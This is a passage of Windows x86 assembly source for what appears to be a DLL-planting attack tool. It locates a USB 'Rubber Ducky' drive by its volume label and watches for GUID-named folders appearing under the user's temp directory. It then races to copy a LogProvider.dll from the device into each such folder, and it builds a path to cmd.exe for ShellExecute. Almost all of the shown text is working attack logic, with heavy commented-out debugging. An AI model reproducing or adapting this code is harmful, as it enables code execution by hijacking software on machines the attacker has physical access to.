			;invoke CreateProcess,CreateProcess_cmd,CreateProcess_params,NULL,NULL,FALSE,0,NULL,NULL,sinfo,pinfo

	;invoke ShellExecute,NULL,lpShellExec_Verb,ShellExecute_FileTst,NULL,NULL,SW_SHOW	
	;invoke ShellExecute,NULL,lpShellExec_Verb,ShellExecute_FileTst,NULL,NULL,SW_SHOW


	msg_loop:
		invoke GetMessage,msg,NULL,0,0
		cmp eax, 1
		jb Exit_Proc
		jne msg_loop
		invoke TranslateMessage, msg
		invoke DispatchMessage, msg
		jmp msg_loop

	Error:
		;call ShowLastError
		invoke	MessageBox,NULL,_error,NULL,MB_ICONERROR+MB_OK

    Exit_Proc:
		invoke	ExitProcess,[msg.wParam]
endp


proc DirectoryMonitor_ThreadProc

local	local__buf[MAX_PATH]:WORD				;This is a WORD because FileName is a word in FILE_NOTIFICATION_INFORMATION: FileName dw 	?
local	ansi__buf[MAX_PATH]:BYTE
local	bufRDCW[1024]:FILE_NOTIFY_INFORMATION
local	numBR:DWORD

;invoke	MessageBox,NULL,PauseMsg,NULL,MB_ICONERROR+MB_OK

;Code 'borrowed' from: https://board.flatassembler.net/topic.php?t=4835
;which is then 'borrowed' from http://www.codeguru.com/Cpp/W-P/files/article.php/c4467/
;http://blogs.msdn.com/ericgu/archive/2005/10/07/478396.aspx
;http://www.codeproject.com/file/FileSpyArticle.asp

	;these next 5 lines to touch all pages reserved for locals
		mov	eax, ebp
		local_continue_fixing:
			cmp eax, esp
			jae local_fixup_NOT_complete
			jmp DirectoryCheck
				
			local_fixup_NOT_complete:
				mov dword [eax], 0			;touch the page with a 0 so as not to violate gaurd page
				sub eax, 1024				;should we check the next page?
				jmp local_continue_fixing
			
	DirectoryCheck:
		lea eax, [bufRDCW]
		lea ecx, [numBR]

		;As per: https://msdn.microsoft.com/en-us/library/windows/desktop/aa365465(v=vs.85).aspx
			;Return value
			;If the function succeeds, the return value is nonzero. For synchronous calls, this means that the operation succeeded. For asynchronous calls, this indicates that the operation was successfully queued.
			;If the function fails, the return value is zero. To get extended error information, call GetLastError.
			;3800 = 1024 * 14 (bytes in FILE_NOTIFY_INFORMATION structure)
				invoke ReadDirectoryChangesW,[Directory_Handle],eax,1024 * sizeof.FILE_NOTIFY_INFORMATION,FALSE,FILE_NOTIFY_CHANGE_DIR_NAME,ecx,NULL,NULL
		
				;invoke ReadDirectoryChangesW,[Directory_Handle],dword ptr bufRDCW,1024 * sizeof.FILE_NOTIFY_INFORMATION,FALSE,FILE_NOTIFY_CHANGE_DIR_NAME,[numBR],NULL,NULL
				;invoke ReadDirectoryChangesW,Directory_Handle,eax,1024 * sizeof.FILE_NOTIFY_INFORMATION,FALSE,FILE_NOTIFY_CHANGE_DIR_NAME,ecx,NULL,NULL
				;call ShowLastError
		
		mov	eax, [numBR]

		push ebx
		push esi
		push edi

		lea	ebx, [bufRDCW]		;ebx used to store address of 'this' FILE_NOTIFY_INFORMATION struct
		;push ecx
		;	mov ecx, [bufRDCW]
		;	mov ebx, ecx
			
		;	;mov ebx, dword ptr bufRDCW
		;pop ecx
		
		mov	edi, [bufRDCW]		;edx used to store offset to 'next' FILE_NOTIFY_INFORMATION struct
		
		;ebx and edi should technically be pointing at the same address at this point, since the 'next'
		;member is the veyr first member in the structure
		
		CheckChanges:
			mov		esi, ebx				;ebx points to current struct
				add		esi, 12				;esi now points to 'filename'


			mov		edi, [ebx]				;store the address of the next entry in edi
			
			push	edi						;save this address so edi can be reused.

				lea		edi, [local__buf]		;store the destination address in edi for str-to-str copy operation
				mov		ecx, dword [ebx + 8]	;ebx + 8 = filename length
				rep		movsb					;repeat movsb for cx number of times
												;movsb = mov byte from string to string (SI and DI depending on direction flag)
				mov		[edi], word 0			;terminate UNICODE string with 0
												;local__buf now contains the filename in unicode form and terminated with a 0

			pop		edi						;restore the contents of edi, so that edi is now pointing to the next entry again.


			;Convert the newly formed local__buf contents.
				;This works!
					;invoke	WideCharToMultiByte, CP_ACP, NULL, addr local__buf, -1, addr ansi__buf, MAX_PATH, NULL, NULL

				;invoke	WideCharToMultiByte, CP_ACP, NULL, word ptr local__buf, -1, byte ptr ansi__buf, MAX_PATH, NULL, NULL

				push ebx
				push ecx

					lea ebx, [local__buf]
					lea ecx, [ansi__buf]

						invoke strlenW, addr local__buf

						mov edx, eax
						shl edx, 2		; multiply by 2
						xor eax, eax

						lea esi, [local__buf]
						lea edi, [ansi__buf]

						Continue_Str2Str:

							cmp edx, dword 0
							jl Str2Str_Finished

							lodsw
							stosb
							sub edx, 4

							jmp Continue_Str2Str

						Str2Str_Finished:

				pop ecx
				pop ebx



				push ebx
				lea	 ebx, [ansi__buf]

				;invoke	MessageBox,NULL,addr ansi__buf,NULL,MB_ICONERROR+MB_OK

				push esi
				push edi
				
					mov esi, Invalid_HexChars
					mov edi, TestChar
					
					Check_For_Invalid_Chars:
						lodsb
							cmp al, 0
							je Check_For_Valid_Format_PrimeLoop
						stosb
						invoke StrStrI, ebx, TestChar
						mov edi, TestChar							;Reset the memory address
						cmp eax, NULL
						jne Invalid_GUID_Directory
						jmp Check_For_Invalid_Chars
	
					Check_For_Valid_Format_PrimeLoop:
					
				pop edi
				pop esi			

				push esi
				push edi
				push ecx

						lea ebx, [ansi__buf]
	
						mov esi, Hyphen_Locations
						lea edi, [TestValue]
	
						Check_For_Valid_Format:
							lodsb
								cmp al, 0
								je Format_Check_Passed
							stosb
	
							;TestValue now contains the element value of Hyphen_Locations
	
							invoke StrStrI, ebx, Hyphen			;0x2D is a hyphen in hexadecimal   -- Remember
																;the format should be: ________-____-____-____-____________
								cmp eax, NULL
								je Invalid_GUID_Directory
	
								push eax			;substr ptr
									sub eax, ebx
									mov edx, eax
								pop eax

	
								push ecx			;Save the ecx register since we're about to trample it
									xor ecx, ecx	;Clear the ecx register to make it ready to use.
	
									sub edi, 1
									mov ecx, edi
									cmp edx, [ecx]
										jne Invalid_GUID_Directory
	
									;Offset the ebx/ansi__buf memory location by adding the location found onto the ptr of the
									;full string's base memory address; otherwise the strstr will keep returning back 8
									;as the found address and the math will be wrong and you will wonder why the algorithm
									;is not working. Well, it's because you have to offset the memory address that is passed
									;to strstr!!!!!!!!!
										lea ebx, [ansi__buf + edx + 1]
	
								pop ecx
	
							jmp Check_For_Valid_Format
				
				Format_Check_Passed:
					;GUID directory name matches format it should be!!!!
					;Add the GUID onto the end of the Dst Dir path
						lea esi, [ansi__buf]
						;push ecx
						;	lea ecx, [ansi__buf]
						;	mov esi, [ecx]
						;pop ecx
						;lea edi, dword ptr lpDst_FullPath
						
						push ecx
							lea ecx, [lpDst_FullPath]
							mov edi, [ecx]
						pop ecx
						;lea edi, [lpDst_FullPath]
						
						sub [lpDst_1stHalf], 1
						sub [Username_Length], 1
						sub [lpDst_2ndHalf], 1
						
							add edi, [lpDst_1stHalf]
							add edi, [Username_Length]
							add edi, [lpDst_2ndHalf]
						
						add [lpDst_1stHalf], 1
						add [Username_Length], 1
						add [lpDst_2ndHalf], 1
						
						Add_GUID:
							;lodsb
							;cmp al, 0
							;je Adding_GUID_Finished
							;stosb
							;push ecx
							;	mov ecx, 37
							;	rep movsb
							;pop ecx
							lodsb
							cmp al, 0
							je Adding_GUID_Finished
							stosb
							jmp Add_GUID

						Adding_GUID_Finished:
							lea esi, [Locale_DstPath]
							
						Add_Locale:
							lodsb
							cmp al, 0
							je Add_Locale_Finished
							stosb
							jmp Add_Locale
						
						Add_Locale_Finished:							
							;mov [edi], byte ptr Backslash			;0x5C = \
							mov [edi], byte 5Ch
							add edi, 1
							lea esi, [Dst_Filename]

						Add_Filename:
							lodsb
							cmp al, 0
							je Adding_Filename_Finished
							stosb
							jmp Add_Filename
							
						Adding_Filename_Finished:
							mov [edi], dword 0
							;push ecx
							;	mov ecx, 9
							;	rep movsb
							;pop ec

					;invoke MessageBox,NULL,DirectoryCreationDetected,NULL,MB_ICONERROR + MB_OK


					pop ecx
					pop edi
					pop esi

					mov [GUID_Located], TRUE					

					jmp CheckChanges_Done

		Invalid_GUID_Directory:
				pop edi
				pop esi	
				jmp CheckChanges_Done
				
			;cmp edi, 0

			;jne unknown_label1
			;jmp unknown_label2

			;unknown_label1:
			;	add	ebx, edi
			;	mov edi, [ebx]

			;unknown_label2:
			;	add ebx, edi


		;cmp edi, 0
		;	je CheckChanges_Done

		;jmp	CheckChanges
		jmp CheckChanges_Done
		
		CheckChanges_Done:
			pop		esi
			pop		edi
			pop		ebx
	
	;cmp 
	;je DirectoryCheck
	;jmp DirectoryCheck
	
;return
ret
endp

;proc Find_RubberDucky uses ecx ebx esi edi
proc Find_RubberDucky

	;Determine the drive letter for the Rubber Ducky
	;https://msdn.microsoft.com/en-us/library/windows/desktop/aa364993(v=vs.85).aspx
		;BOOL WINAPI GetVolumeInformation(
		;  _In_opt_  LPCTSTR lpRootPathName,
		;  _Out_opt_ LPTSTR  lpVolumeNameBuffer,
		;  _In_      DWORD   nVolumeNameSize,
		;  _Out_opt_ LPDWORD lpVolumeSerialNumber,
		;  _Out_opt_ LPDWORD lpMaximumComponentLength,
		;  _Out_opt_ LPDWORD lpFileSystemFlags,
		;  _Out_opt_ LPTSTR  lpFileSystemNameBuffer,
		;  _In_      DWORD   nFileSystemNameSize
		;);
		RB_Drive_1:
			;First check if the current drive letter is sitting at 0, if it is, adding one,
			;just a few instructions further isn't going to make sense. So error now... 
				mov ecx, Max_DriveLetter
				mov ebx, Current_Drv_Letter

				;WARNING!!!!!: strcmp seems to ONLY work with dwords (dd) no matter what kind of casting you do...									
					invoke strcmp,ebx,ecx
						
				cmp eax, 0
				je RB_Drive_1_Exhausted
			
				xor ebx, ebx
				xor ecx, ecx
				
				
				;Bump the drive letter up by one and check (again)
					add [Current_Drv_Letter], 1
					
					mov esi, Current_Drv_Letter
					mov edi, VolInfo.lpRootPathName
						lodsb
						stosb
						
						;no need to add 1 to edi, it's already been incremented by the stosb instruction.
						
						mov byte [edi], ":"
							add edi, 1
							mov byte [edi], "\"
								add edi, 1
								mov byte [edi], 0

					xor edi, edi
					xor esi, esi
					
					invoke GetDriveType,VolInfo.lpRootPathName
					
					cmp eax, DRIVE_REMOTE
					je RB_Drive_1
										
					;invoke GetVolumeInformation,VolInfo.lpRootPathName, VolInfo.lpVolumeName_Buffer, VolInfo.nVolumeNameSize, VolInfo.lpVolumeSerialNumber, VolInfo.lpMaximumComponentLength, VolInfo.lpFileSystemFlags, VolInfo.lpFileSystemNameBuffer, VolInfo.nFileSystemNameSize
					invoke GetVolumeInformation,VolInfo.lpRootPathName, VolInfo.lpVolumeName_Buffer, [VolInfo.nVolumeNameSize], VolInfo.lpVolumeSerialNumber, VolInfo.lpMaximumComponentLength, VolInfo.lpFileSystemFlags, VolInfo.lpFileSystemNameBuffer, [VolInfo.nFileSystemNameSize]
					;invoke GetVolumeInformation,VolInfo.lpRootPathName,VolInfo.lpVolumeName_Buffer,nVolumeNameSize, VolInfo.lpVolumeSerialNumber, VolInfo.lpMaximumComponentLength, VolInfo.lpFileSystemFlags, VolInfo.lpFileSystemNameBuffer, 2						

						mov ebx, VolInfo.lpVolumeName_Buffer
						mov ecx, Src_Drv_Label
						mov eax, 0
						
							;invoke strcmp,ebx,ecx
							invoke lstrcmp, ebx, ecx

						xor ecx, ecx
						xor ebx, ebx
						
						cmp eax, 0
						
						jne RB_Drive_1
						je RB_Drive_1_Found
						
			RB_Drive_1_Exhausted:
				xor eax, eax
				invoke	MessageBox,NULL,VolIter_Exhausted_MSG,NULL,MB_ICONERROR+MB_OK
				invoke	PostMessage,[hWnd_Main],WM_DESTROY,0,0
				;pop eax
				;pop edi
				;pop esi
				ret
				
			RB_Drive_1_Found:
				;mov ecx, VolInfo.lpVolumeName_Buffer
				mov ecx, VolInfo.lpRootPathName
				;invoke MessageBox,NULL,ecx,VolIter_RD_Found_MSG,MB_ICONERROR+MB_OK

			xor eax, eax
			xor ebx, ebx
			xor ecx, ecx
			xor edi, edi
			xor esi, esi

;return
ret
endp

proc Allocate_Full_SrcPath_Mem uses ebx

	;invoke	MessageBox,NULL,DBG_MSG_Allocate_Full_SrcPath_Mem_BP1,NULL,MB_ICONERROR+MB_OK
	;xor eax, eax
	;xor ecx, ecx
	
	;mov ebx, [Full_SrcPathAndFilename_length]
	;cinvoke malloc, ebx
	;cinvoke malloc,[Full_SrcPathAndFilename_length]
	;invoke HeapAlloc,dword ptr ProcessHeap,HEAP_GENERATE_EXCEPTIONS+HEAP_ZERO_MEMORY,[Full_SrcPathAndFilename_length]
	;invoke HeapAlloc,dword ptr ProcessHeap,HEAP_ZERO_MEMORY,[Full_SrcPathAndFilename_length]
	invoke HeapAlloc,[ProcessHeap],HEAP_ZERO_MEMORY,Full_SrcPathAndFilename_length
	;push eax
	;call ShowLastError
	;pop eax
	;cinvoke malloc, [Full_SrcPathAndFilename_length]
	;invoke malloc, [Full_SrcPathAndFilename_length]
	;push [Full_SrcPathAndFilename_length]
	;call malloc
	
		mov [lpFull_SrcPathAndFilename], eax
	
	xor ecx, ecx
	xor eax, eax
	
	;call ShowLastError
	
	;invoke	MessageBox,NULL,DBG_MSG_Allocate_Full_SrcPath_Mem_BP2,NULL,MB_ICONERROR+MB_OK
	;cinvoke memset, dword ptr lpFull_SrcPathAndFilename, 0, [Full_SrcPathAndFilename_length]
	;cinvoke memset, lpFull_SrcPathAndFilename, 0, [Full_SrcPathAndFilename_length]
	;invoke	MessageBox,NULL,DBG_MSG_Allocate_Full_SrcPath_Mem_BP3,NULL,MB_ICONERROR+MB_OK
	
;return
ret
endp

proc Build_Full_SrcPath uses esi edi

	;invoke	MessageBox,NULL,DBG_MSG_Calling_Allocate_Full_SrcPath_Mem,NULL,MB_ICONERROR+MB_OK
	call Allocate_Full_SrcPath_Mem

	;invoke	MessageBox,NULL,DBG_MSG_Calling_Find_RubberDucky,NULL,MB_ICONERROR+MB_OK
	call Find_RubberDucky
	
	;invoke	MessageBox,NULL,DBG_MSG_Adding_RubberDucky_to_SrcPath,NULL,MB_ICONERROR+MB_OK
	;Add Rubber Ducky drive letter to destination path.
		mov esi, VolInfo.lpRootPathName
		mov edi, dword ptr lpFull_SrcPathAndFilename
		
		lodsb
		stosb
		
		mov esi, Full_SrcPathAndFilename
		mov edi, dword ptr lpFull_SrcPathAndFilename
			add edi, 1
	
	Src_Path_Build:
		lodsb
			cmp al, 0x00
			je Finish_Src_Path_Build
		stosb
		jmp Src_Path_Build
	Finish_Src_Path_Build:
		mov [edi], dword 0

	xor eax, eax
	xor edi, edi
	xor esi, esi
	
	
	
	
;return
ret
endp




proc Allocate_Username_Mem

	;cinvoke malloc, [Username_Length]
	;invoke HeapAlloc,dword ptr ProcessHeap,HEAP_GENERATE_EXCEPTIONS+HEAP_ZERO_MEMORY,[Username_Length]
	invoke HeapAlloc,[ProcessHeap],HEAP_ZERO_MEMORY,[Username_Length]
	;mov [Username], eax
	mov ebx, Username
	mov [Username], eax
	cmp eax, STATUS_ACCESS_VIOLATION
	cmp eax, STATUS_NO_MEMORY
;return
ret
endp


proc Get_Username uses esi

	;As per: https://msdn.microsoft.com/en-us/library/windows/desktop/ms724432(v=vs.85).aspx
		;A pointer to the buffer to receive the user's logon name. If this buffer is not large enough to contain the entire user name, the function fails. A buffer size of (UNLEN + 1) characters will hold the maximum length user name including the terminating null character. UNLEN is defined in Lmcons.h.
		;If the function succeeds, the return value is a nonzero value, and the variable
		;pointed to by lpnSize contains the number of TCHARs copied to the buffer
		;specified by lpBuffer, including the terminating null character.

		invoke GetUserName,sName,Username_Length
			;call ShowLastError
		
	;call ShowLastError
	cmp eax, 0
	jne UserNameRetrieved
	;... error...
	invoke MessageBox,NULL,DBG_MSG_Error_Retrieving_Username,NULL,MB_ICONERROR+MB_OK
	;TODO: Add returning error code here.
	ret

	;mov [Username_Length], 0
	UserNameRetrieved:		
		;mov esi, sName
		;add esi, 1
		;mov esi, dword NULL

;return
ret
endp


proc Store_Username uses esi edi ecx

	;Reserve the space for sName, so it doesn't get trampled!
		mov ecx, 255
		invoke HeapAlloc,[ProcessHeap],HEAP_GENERATE_EXCEPTIONS+HEAP_ZERO_MEMORY,ecx
		mov [sName], eax
	
	call Get_Username
	call Allocate_Username_Mem
	
		xor esi, esi

		;Subtract 1 from Username_Length because the 0 terminator is being ignored for now, and also
		;subtract another 1 because this is 0-indexed.
			sub [Username_Length], 1
			
		;mov esi, dword ptr sName
		;mov esi, sName
		mov esi, sName
		;mov ecx, [Username]
		;mov edi, ecx
		mov edi, [Username]
		
		xor ecx, ecx
		mov ecx, 0

		Store_UN:
			;NOTE: For some reason OllyDbg shows this as lods NOT lodsb which is a HUGE difference!!!!
				lodsb
				
			add ecx, 1
			cmp ecx, [Username_Length]
			
			;NOTE: For some reason OllyDbg shows this as stos NOT stosb which is a HUGE difference!!!!
				stosb
				
			je Store_UN_Finished
			jmp Store_UN
			
		Store_UN_Finished:
			;sub [Username_Length], 0
			;add esi, [Username_Length]
			;add [Username_Length], 1
			;;mov byte [esi], 1
			;mov [esi], dword 0
			;xor esi, esi

		add [Username_Length], 1
		
	;Free the heap space back from the sName allocation!
	;This yields an ERROR_INVALID_PARAMETER result
	;TODO: Possible memory leak. but GetUsername seems to allocate sName's memory space
		;invoke HeapFree,[ProcessHeap],0,[sName]
		;mov ecx, [sName]
		;mov ecx, sName
		;invoke HeapFree,[ProcessHeap],0,ecx
;return
ret
endp



proc Get_Dst_PathAndFile_Length uses ecx edx

	;Now that the string length for the destination path can be determined, allocate the amount
	;needed to hold the string in heap memory.
		;First determine the string length
			mov [lpDst_Path_Length], NULL			;zero out the value first.
			mov [lpDst_PathAndFile_Length], NULL	;zero out the value first.
				xor ecx, ecx
				
				;mov ecx, lpDst_Path_Length
				
					xor edx, edx				
				
					;lpDst_1stHalf length is technically lpDst_1stHalf - 1. -1 Because to subtract out the 0 terminator.
						sub [lpDst_1stHalf], 1
						
						;Problem line. Tramples the 0 terminator of sName for some reason...
							mov edx, [lpDst_1stHalf]
					;Readd the 0 terminator back onto the length of lpDst_1stHalf
						add [lpDst_1stHalf], 1
					
						
					;Username length is technically Username_Length - 1. -1 Because to subtract out the 0 terminator.
					;So adjust that now...
						sub [Username_Length], 1
						add edx, [Username_Length]
					
					;Readd the 0 terminator back onto the length of Username_Length
						add [Username_Length], 1



					;lpDst_1stHalf lpDst_2ndHalf is technically lpDst_2ndHalf - 1. -1 Because to subtract out the 0 terminator.
						sub [lpDst_2ndHalf], 1

							add edx, [lpDst_2ndHalf]

							;Add the length of the GUID onto the end
								;add edx, 37					;________-____-____-____-____________ is 37 character long
								add edx, GUID_Length

							mov [lpDst_Path_Length], edx
							add [lpDst_Path_Length], 1		;Add 1 for the \, because the GUID will be added on
															;later, the zero terminator will also be added on later.

					;Readd the 0 terminator back onto the length of lpDst_2ndHalf
						add [lpDst_2ndHalf], 1

					;Format: c:\users\<username>\AppData\Local\temp\________-____-____-____-____________\LogProvider.dll
						;add edx, [lpDst_Path_Length]
						mov [lpDst_PathAndFile_Length], edx
						add [lpDst_PathAndFile_Length], lpDst_FilenameLength

ret
endp


proc Allocate_Full_DstPath_Mem uses ebx

	call Get_Dst_PathAndFile_Length
	
	xor ebx, ebx
	mov ebx, [lpDst_PathAndFile_Length]
	invoke HeapAlloc,[ProcessHeap],HEAP_GENERATE_EXCEPTIONS+HEAP_ZERO_MEMORY,ebx
	mov [lpDst_FullPath], eax
	
	xor eax, eax
	
	
	xor ebx, ebx
	mov ebx, [lpDst_Path_Length]
	invoke HeapAlloc,[ProcessHeap],HEAP_GENERATE_EXCEPTIONS+HEAP_ZERO_MEMORY,ebx
	mov [lpDst_Path], eax
	
	xor eax, eax
	
;return
ret
endp


proc Build_DstPath uses esi edi

	mov esi, Pre_DstPath
	mov edi, dword ptr lpDst_Path 
	Dst_Path_Build_1:
		lodsb							;Copy byte (SI - 8 bits from esi) to AL
			cmp al, 0					;Hit the null-terminator
			je Dst_Path_Build_2_1
		stosb							;Copy byte (AL - 8-bits) to edi
		jmp Dst_Path_Build_1

		Dst_Path_Build_2_1:
			mov esi, [Username]
			Dst_Path_Build_2_2:
				lodsb							;Copy byte (SI - 8 bits from esi) to AL
					cmp al, 0					;Hit the null-terminator
					je Dst_Path_Build_3_1
				stosb
				jmp Dst_Path_Build_2_2

				Dst_Path_Build_3_1:
					mov esi, Post_DstDirPath
					Dst_Path_Build_3_2:
						lodsb						;Copy byte (SI - 8 bits from esi) to AL
							cmp al, 0				;Hit the null-terminator
							je Finish_DFPB
						stosb
						jmp Dst_Path_Build_3_2

	Finish_DPB:
		mov [edi], dword 0
		
;return
ret
endp

proc Build_Full_DstPath uses esi edi 

	;This yields an ERROR_INVALID_PARAMETERS result
		call Store_Username

	;Allocate the memory
		call Allocate_Full_DstPath_Mem
	
	call Build_DstPath
	
	
	;Now that the appropriate amount of Heap space is allocated, start filling it with the
	;components that makeup the full destination path and filename.
		mov esi, Pre_DstPath
		mov edi, dword ptr lpDst_FullPath 
		Dst_FullPath_Build_1:
			;So basically: (E)SI (1 byte at a time) -> AL -> EDI (incrementally positioned each stosb call)
				lodsb							;Copy byte (SI - 8 bits from esi) to AL
					cmp al, 0					;Hit the null-terminator
					je Dst_FullPath_Build_2_1
				stosb							;Copy byte (AL - 8-bits) to edi
				jmp Dst_FullPath_Build_1

				Dst_FullPath_Build_2_1:
					;mov esi, sName
					mov esi, [Username]
					Dst_FullPath_Build_2_2:
						;So basically: (E)SI (1 byte at a time) -> AL -> EDI (incrementally positioned each stosb call)
							lodsb							;Copy byte (SI - 8 bits from esi) to AL
								cmp al, 0					;Hit the null-terminator
								je Dst_FullPath_Build_3_1
							stosb
							jmp Dst_FullPath_Build_2_2

							Dst_FullPath_Build_3_1:
								mov esi, Post_DstPath
								Dst_FullPath_Build_3_2:
									;So basically: (E)SI (1 byte at a time) -> AL -> EDI (incrementally positioned each stosb call)
										lodsb						;Copy byte (SI - 8 bits from esi) to AL
											cmp al, 0				;Hit the null-terminator
											je Finish_DFPB
										stosb
										jmp Dst_FullPath_Build_3_2

										
	Finish_DFPB:
		mov [edi], dword 0
;return
ret
endp



proc Allocate_Full_ShellExecPath_Mem

	;mov ecx, lpShellExec_File_Length
	;add [ecx], byte 1		;0 terminator
	add [lpShellExec_File_Length], 1
	mov ecx, [lpShellExec_File_Length]
	;cinvoke malloc, ecx
	invoke HeapAlloc,[ProcessHeap],HEAP_GENERATE_EXCEPTIONS+HEAP_ZERO_MEMORY,ecx
				
		mov [lpShellExec_File], eax
		
	sub [lpShellExec_File_Length], 1
	
	xor eax, eax
	xor ecx, ecx

	;TODO: Change this to memset! RtlZeroMemory plays screwy games with stuff it seems. It ends up calling memset anyway.
		;invoke RtlZeroMemory,[lpShellExec_File],[lpShellExec_File_Length]
						
;return
ret
endp

proc Get_ShellExecPath_Length uses ebx

	xor ebx, ebx
	
		;Set ebx to the lpShellExec_File_Length's memory address.
			mov ebx, lpShellExec_File_Length
			
				add byte [ebx], byte lpShellExecute_Drv_Length
				add byte [ebx], byte lpShellExecute_WinDir_Length
				add byte [ebx], byte lpShellExecute_SysDir_Length
				add byte [ebx], byte lpShellExecute_Filename_Length

	xor ebx, ebx
	
;return
ret
endp

proc Build_Full_ShellExecPath uses esi edi

	call Get_ShellExecPath_Length
	
	;Allocate the memory
		call Allocate_Full_ShellExecPath_Mem
	
	mov esi, ShellExecute_Drv
	mov edi, dword ptr lpShellExec_File 
	
	ShellExecute_Path_Build_1:
		;So basically: (E)SI (1 byte at a time) -> AL -> EDI (incrementally positioned each stosb call)
			lodsb									;Copy byte (SI - 8 bits from esi) to AL
				cmp al, 0							;Hit the null-terminator
				je ShellExecute_Path_Build_2_1
			stosb									;Copy byte (AL - 8-bits) to edi
			jmp ShellExecute_Path_Build_1
			
			ShellExecute_Path_Build_2_1:
				mov esi, ShellExecute_WinDir
				ShellExecute_Path_Build_2_2:
					;So basically: (E)SI (1 byte at a time) -> AL -> EDI (incrementally positioned each stosb call)
						lodsb								;Copy byte (SI - 8 bits from esi) to AL
							cmp al, 0						;Hit the null-terminator
							je ShellExecute_Path_Build_3_1
						stosb
						jmp ShellExecute_Path_Build_2_2
			
					;TODO: The code could determine the architecture type and select accordingly...
						ShellExecute_Path_Build_3_1:
						
							;TODO: Add code to determine desired cmd.exe platform to use.
								;mov esi, ShellExecute_AMD64
								mov esi, ShellExecute_x86
							ShellExecute_Path_Build_3_2:
								;So basically: (E)SI (1 byte at a time) -> AL -> EDI (incrementally positioned each stosb call)
									lodsb								;Copy byte (SI - 8 bits from esi) to AL
										cmp al, 0						;Hit the null-terminator
										je ShellExecute_Path_Build_4_1
									stosb
									jmp ShellExecute_Path_Build_3_2
			
									ShellExecute_Path_Build_4_1:
										mov esi, ShellExecute_Filename
										ShellExecute_Path_Build_4_2:
											;So basically: (E)SI (1 byte at a time) -> AL -> EDI (incrementally positioned each stosb call)
												lodsb					;Copy byte (SI - 8 bits from esi) to AL
													cmp al, 0			;Hit the null-terminator
													je Finish_SEPB
												stosb
												jmp ShellExecute_Path_Build_4_2
	Finish_SEPB:
		mov [edi], dword 0

;return
ret
endp



;proc Initialize
proc Initialize uses esi edi ecx

local WinProc_Finished_Creating_MainWindow_DBG_MSG_Length:DWORD
local Stack_Size:DWORD
;local sName:DWORD

	mov esi, WinProc_Finished_Creating_MainWindow_DBG_MSG
	mov edi, MsgBox_Text 
	ByteToDWORD_1:
			lodsb					;Copy byte (SI - 8 bits from esi) to AL
		Adj_Stack_1:
			add [Stack_Size], 1
			cmp al, 0				;Hit the null-terminator
			jne ByteToDWORD_1
		Finish_BtD_1:
			sub [Stack_Size], 1

	mov ecx, [Stack_Size]
	mov [WinProc_Finished_Creating_MainWindow_DBG_MSG_Length], ecx
	;add [WinProc_Finished_Creating_MainWindow_DBG_MSG_Length], 1
	xor ecx, ecx
	
	;cinvoke malloc, [WinProc_Finished_Creating_MainWindow_DBG_MSG_Length]
	invoke HeapAlloc,dword ptr ProcessHeap,HEAP_GENERATE_EXCEPTIONS+HEAP_ZERO_MEMORY,[WinProc_Finished_Creating_MainWindow_DBG_MSG_Length]
	mov [MsgBox_Text], eax
	;invoke RtlZeroMemory,[MsgBox_Text],[WinProc_Finished_Creating_MainWindow_DBG_MSG_Length]
	
	xor eax, eax
	xor ecx, ecx
	
	
	
	mov esi, WinProc_Finished_Creating_MainWindow_DBG_MSG
	mov edi, dword ptr MsgBox_Text 
	ByteToDWORD_2:
		;So basically: (E)SI (1 byte at a time) -> AL -> EDI (incrementally positioned each stosb call)
			lodsb					;Copy byte (SI - 8 bits from esi) to AL
			stosb					;Copy byte (AL - 8-bits) to edi
		Adj_Stack_2:
			cmp al, 0				;Hit the null-terminator
			jne ByteToDWORD_2
		Finish_BtD_2:

	xor eax, eax
	xor edi, edi
	xor esi, esi

	ret
endp


;proc TimerProc_FileCopy hwnd, uMsg, idEvent, dwTime
proc TimerProc_FileCopy
local FileCopy_RetryCount:DWORD

	xor eax, eax
	
	cmp [GUID_Located], TRUE
	jne Delay_FileCopyOp
	
	;invoke KillTimer, [hwnd], FILEWATCHTIMERID
	;invoke KillTimer, [hWnd_Main], DIRECTORYMONITORTIMERID
	
	;This is occuring...
		;invoke MessageBox,NULL, Dbg_TimerProc_FileCopy_Msg1, Dbg_TimerProc_FileCopy_Title, MB_ICONERROR + MB_OK
	
	;invoke FindFirstFile, DWORD ptr lpDst_FullPath, FileInfo
	;invoke FindFirstFile, [lpDst_FullPath], FileInfo
	invoke FindFirstFile, lpDst_FullPath, FileInfo		
	cmp eax, INVALID_HANDLE_VALUE
		je FindFile_Error
	cmp eax, 2					;According to windows.inc: ERROR_FILE_NOT_FOUND = 2		-- Though, for whatever reason, fASM doesn't seem to see
																						   ;the file included.
		je FileNotExistantYet
	
	;call ShowLastError
	
	;invoke KillTimer, [hWnd_Main], FILEWATCHTIMERID
	
	;This is NOTIFY_BEGIN_INBOUND occuring...
	;	invoke MessageBox,NULL, dword ptr lpDst_FullPath, dword ptr lpFull_SrcPathAndFilename, MB_ICONERROR + MB_OK
	
	mov [FileCopy_RetryCount], 0
	BurnTheHouseDown_FileCopy:
		;invoke CopyFile, dword ptr lpFull_SrcPathAndFilename, dword ptr lpDst_FullPath, FALSE
		;invoke CopyFile, [lpFull_SrcPathAndFilename], [lpDst_FullPath], FALSE
		invoke CopyFile, lpFull_SrcPathAndFilename, lpDst_FullPath, FALSE
		cmp eax, TRUE
		je BurnTheHousedown_FileCopy_AttemptExhausted
		call ShowLastError
		;push ecx
		;push edx
		;add [FileCopy_RetryCount], 1
		;cmp [FileCopy_RetryCount], 5	
		;je BurnTheHousedown_FileCopy_AttemptExhausted
		;jmp BurnTheHouseDown_FileCopy
		;jmp BurnTheHouseDown_FileCopy
	
	BurnTheHousedown_FileCopy_AttemptExhausted:
	;lea ecx, [lpFull_SrcPathAndFilename]
	;lea edx, [lpDst_FullPath]
	;invoke CopyFile, ecx, edx, FALSE

	;Technically they're COULD be 5 different return statuses and the only status that is being captured is the
	;last attempt.
	cmp eax, 5	;According to windows.inc: ERROR_ACCESS_DENIED = 5		-- Though, for whatever reason, fASM doesn't seem to see
																		   ;the file included.
	je FileCopy_ACCESS_DENIED

	jmp FileCopy_SUCCESS

	FindFile_Error:
		invoke MessageBox,FindFile_Invalid_Handle_Value_Text,FindFile_Invalid_Handle_Value_Title,NULL,MB_ICONERROR+MB_OK
		jmp	ExitFileCopy

	FileNotExistantYet:
		cmp [MsgBox_Count], 1
		jge ExitFileCopy
		add [MsgBox_Count], 1

		;invoke MessageBox,NULL,FileExistanceDetected,NULL,MB_ICONERROR+MB_OK
		jmp	ExitFileCopy

	FileCopy_SUCCESS:
